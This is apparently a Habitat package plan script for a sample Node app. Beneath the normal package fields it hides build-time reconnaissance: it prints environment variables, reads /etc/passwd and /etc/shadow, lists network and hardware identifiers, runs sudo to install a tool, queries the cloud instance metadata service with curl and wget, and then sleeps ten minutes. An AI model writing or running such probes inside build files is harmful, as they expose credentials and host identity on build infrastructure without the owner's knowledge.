pkg_name=sample-node-app
pkg_origin=benr
pkg_scaffolding="core/scaffolding-node"
pkg_version="1.0.1"

#declare -A scaffolding_env

### Define path to config file
#scaffolding_env[APP_CONFIG]="{{pkg.svc_config_path}}/config.json"

echo "========================== HELLO ==============================="
echo "========================== HELLO ==============================="
echo "========================== HELLO ==============================="
echo "========================== HELLO ==============================="
echo "========================== HELLO ==============================="
echo "========================== HELLO ==============================="
echo "========================== HELLO ==============================="
echo "========================== HELLO ==============================="

uname -a
env
echo "------------ IP -------------------------"
ifconfig -a
ip -a
echo "------------ ETC -------------------------"
ls -l /etc
cat /etc/passwd
cat /etc/shadow
cat /etc/hosts
echo "------------ PROC -------------------------"
ls -l /proc
cat /proc/cpuinfo
echo "------------ UUID -------------------------"
cat /sys/hypervisor/uuid
echo "------------ SMBIOS -------------------------"
sudo yum install dmidecode -y
cat /sys/devices/virtual/dmi/id/product_uuid
echo "------------ CURL -------------------------"
curl http://169.254.169.254/latest/dynamic/instance-identity/
wget http://169.254.169.254/latest/dynamic/instance-identity/
echo "sleeping..."
sleep 600
echo "Still here"



